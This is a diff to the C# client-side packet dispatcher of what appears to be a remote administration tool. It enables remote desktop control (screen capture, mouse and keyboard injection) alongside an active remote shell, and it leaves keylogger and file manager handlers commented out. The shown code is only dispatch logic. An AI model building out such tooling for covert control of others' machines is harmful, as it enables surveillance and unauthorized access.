@@ -2,7 +2,7 @@
 using Client.Networking.Packets.ClientServices;
 //using Client.Networking.Packets.FileManager;
 //using Client.Networking.Packets.MessageBox;
-//using Client.Networking.Packets.RemoteDesktop;
+using Client.Networking.Packets.RemoteDesktop;
 using Client.Networking.Packets.RemoteShell;
 //using Client.Networking.Packets.TaskManager;
 using Common.Networking.Packets;
@@ -21,7 +21,7 @@ namespace Client.Networking
         //private readonly FileManagerHandler _fileManagerHandler;
         //private readonly MessageBoxHandler _messageBoxHandler;
         //private readonly KeyloggerHandler _keyloggerHandler;
-        //private readonly RemoteDesktopHandler _remoteDesktopHandler;
+        private readonly RemoteDesktopHandler _remoteDesktopHandler;
 
         public ClientHandler(FrmMain application, Client client)
         {
@@ -35,7 +35,7 @@ namespace Client.Networking
             //_fileManagerHandler = new(client);
             //_messageBoxHandler = new(client);
             //_keyloggerHandler = new(client);
-            //_remoteDesktopHandler = new(client);
+            _remoteDesktopHandler = new(client);
         }
 
         //xử lý gói tin (packet) mà client nhận được từ server.
@@ -104,19 +104,19 @@ namespace Client.Networking
                     //case 0x60:
                     //    _ = _keyloggerHandler.GetKeyloggerLogsDirectory();
                     //    break;
-                    //// Remote Desktop
-                    //case 0x70:
-                    //    _ = _remoteDesktopHandler.GetDesktop(ResponsePacket.Deserialize<GetDesktopPacket>(data));
-                    //    break;
-                    //case 0x71:
-                    //    _ = _remoteDesktopHandler.GetMonitors();
-                    //    break;
-                    //case 0x72:
-                    //    _ = _remoteDesktopHandler.MouseEvent(ResponsePacket.Deserialize<MouseEventPacket>(data));
-                    //    break;
-                    //case 0x73:
-                    //    _ = _remoteDesktopHandler.KeyboardEvent(ResponsePacket.Deserialize<KeyboardEventPacket>(data));
-                    //    break;
+                    // Remote Desktop
+                    case 0x70:
+                        _ = _remoteDesktopHandler.GetDesktop(ResponsePacket.Deserialize<GetDesktopPacket>(data));
+                        break;
+                    case 0x71:
+                        _ = _remoteDesktopHandler.GetMonitors();
+                        break;
+                    case 0x72:
+                        _ = _remoteDesktopHandler.MouseEvent(ResponsePacket.Deserialize<MouseEventPacket>(data));
+                        break;
+                    case 0x73:
+                        _ = _remoteDesktopHandler.KeyboardEvent(ResponsePacket.Deserialize<KeyboardEventPacket>(data));
+                        break;
                     default:
                         break;
                 }
@@ -136,7 +136,7 @@ namespace Client.Networking
             //_fileManagerHandler?.Dispose();
             //_messageBoxHandler?.Dispose();
             //_keyloggerHandler?.Dispose();
-            //_remoteDesktopHandler?.Dispose();
+            _remoteDesktopHandler?.Dispose();
 
             GC.SuppressFinalize(this);
         }
